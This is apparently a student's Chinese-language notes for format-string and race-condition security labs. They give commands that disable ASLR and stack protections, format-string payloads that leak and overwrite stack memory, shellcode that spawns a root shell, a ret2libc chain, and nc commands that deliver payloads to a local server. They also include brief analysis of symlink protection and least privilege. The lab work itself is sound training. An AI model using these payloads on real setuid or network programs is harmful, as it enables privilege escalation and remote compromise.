@@ -1,0 +1,151 @@
+关闭ASLR 设置：
+sudo sysctl -w kernel.randomize_va_space=0
+
+关闭和开启 Stack Guard 保护：
+gcc -fno-stack-protector example.c
+gcc -fstack-protector example.c
+
+关闭和开启栈不可执行：
+For executable stack:
+gcc -z execstack -o test test.c
+For non-executable stack:
+gcc -z noexecstack -o test test.c
+
+gcc -o call_shellcode -z execstack -fno-stack-protector call_shellcode.c
+
+gcc -o prog1  prog1.c
+
+使程序崩溃
+%n%n%n%n%n%n%n%n%n%n
+%s%s%s%s%s%s%s%s%s%s%s%s
+
+查看栈内容
+%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
+%x.%x.%x.%x.%x.%x.%x.%x
+\x38\xec\xff\xbf%6$x
+\x38\xec\xff\xbf%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
+
+data地址：bfffec38和bfffec40
+\x38\xec\xff\xbf\x40\xec\xff\xbf
+
+AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
+
+修改栈内容:
+echo $(printf "\x38\xec\xff\xbf@@@@\x36\xec\xff\xbf")%.8x%.8x%.8x%.8x%.8x%.26204x%hn%.4369x%hn > input
+
+echo $(printf "\x36\xec\xff\xbf\x34\xec\xff\xbf")%26240c%6\$hn%4369c%7\$hn | ./prog1
+
+echo $(printf "\x38\xec\xff\xbf\x40\xec\xff\xbf")%30609c%6\$n%61167c%7\$n | ./prog1
+
+
+Prog2任务:
+关闭栈不可执行:
+gcc -z execstack -o prog2 prog2.c
+开启栈不可执行:
+gcc -z noexecstack -o prog2 prog2.c
+关闭Stack Guard保护:
+gcc -fno-stack-protector -o prog2 prog2.c
+开启Stack Guard保护:
+gcc -fstack-protector -o prog2 prog2.c
+
+sudo chown root prog2
+sudo chmod 4755 prog2
+ls -l prog2
+
+
+%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x 
+
+任务1
+数组起始地址0xbfffebe4   恶意代码地址0xbfffebec
+echo $(printf "\xce\xeb\xff\xbf\xcc\xeb\xff\xbf\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")%49119c%17\$hn%11245c%18\$hn > badfile
+
+数组起始地址0xbfffebe4   恶意代码地址0xbfffebec(+8)
+返回地址ebp+4: 0xbfffebc8
+将返回地址分割:0xbfffebce和0xbfffebcc
+
+任务2:
+gdb查找:
+b main
+r
+p system
+p exit
+searchmem "/bin/sh"
+
+
+返回地址ebp+4: 0xbfffebc8
+\xce\xeb\xff\xbf\xcc\xeb\xff\xbf为ebp+4 修改为0xb7da4da0
+\xd2\xeb\xff\xbf\xd0\xeb\xff\xbf为ebp+8 修改为0xb7d989d0
+\xd6\xeb\xff\xbf\xd4\xeb\xff\xbf为ebp+12 修改为0xb7ec582b
+ /bin/sh:0xbffffe1e
+
+echo $(printf "\xcc\xeb\xff\xbf\xd4\xeb\xff\xbf\xd0\xeb\xff\xbf\xd2\xeb\xff\xbf\xce\xeb\xff\xbf\xd6\xeb\xff\xbf")%19848c%17\$hn%2699c%18\$hn%12709c%19\$hn%11785c%20\$hn%1c%21\$hn%18c%22\$hn > badfile
+
+将fmtstr的返回地址(ebp+4)修改为system的地址，ebp+8修改为exit的地址，ebp+12修改为/bin/sh的地址
+
+任务3:
+关闭stack Guard：
+注入shellcode：成功
+ret2libc：成功
+  打开stack Guard：
+注入shellcode：成功
+ret2libc：成功
+
+
+任务4:
+gcc -z execstack -o prog2 prog2.c
+sudo chown root prog2
+sudo chmod 4755 prog2
+echo $(printf "\xae\xeb\xff\xbf\xac\xeb\xff\xbf\x31\xc0\x31\xdb\xb0\xd5\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")%49111c%17\$hn%11469c%18\$hn > badfile             //利用setuid(0)，不是符号链接
+
+
+prog3:
+sudo sysctl -w kernel.randomize_va_space=0
+gcc -DDUMMY_SIZE=80 -z execstack -o server server.c
+gcc -o format-32 format.c
+
+解释：第64个,先运行server(会自动运行format-32)，再用nc命令发送数据
+1)%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
+
+2）echo $(printf "\x28\xbb\x0b\x08")%64\$s > badfile
+   nc 127.0.0.1 9090 < badfile
+   
+3）echo $(printf "\x2e\xa0\x04\x08\x2c\xa0\x04\x08")%43699c%64\$hn%8738c%65\$hn > badfile
+   nc 127.0.0.1 9090 < badfile
+   
+4) test.py生成badfile
+   nc 127.0.0.1 9090 < badfile
+
+数组地址0xbffff680
+ebp:0xbffff5a8
+   
+5)test1.py生成badfile
+nc 127.0.0.1 9090 < badfile | nc -l 7070 -v
+
+
+
+
+竞态
+sudo sysctl -w fs.protected_symlinks=0
+
+gcc vulp.c -o vulp
+sudo chown root vul
+sudo chmod 4755 vul
+perl -e 'print crypt("", "U6")."\n"'
+U6aMy0wojraho
+
+任务2
+
+任务3
+这个方案用于限制普通用户建立软链接。0：不限制用户建立软链
+接；1：限制，允许用户建立软连接的情况是 软连接所在目录是全局可
+读写目录或者软连接的 uid 与跟从者的 uid 匹配，又或者目录所有者与
+软连接所有者匹配。所以在普通用户 uid 下，无法与 root 权限的文件
+建立软连接。我并不认为这个方法是有效的。因为这个方法可以通过越过用户
+权限来绕过，进而建立软连接。
+这个方法的限制是他违反了 POSIX 原则，为了安全去遵守一个不
+规范的原则是没有用的。其次，他可能会损坏一些未知的应用。
+
+任务4
+这个principle的核心思想便是，在需要使用root的时候再使用root，在其他的时间，我们使用实际的UID进行我们的程序操作，代码如下。可以看到，我们在access之前，加入了函数seteuid，其可以在程序中设定我们的effective UID，避免出现错误赋予低权限用户高权限操作的漏洞。
+
+报segment fault的原因是，在我们修改EID之后，事实上使用seed用户的身份去对root用户的相关内容进行操作，因为不同用户的内存空间不同，这回导致segment fault。
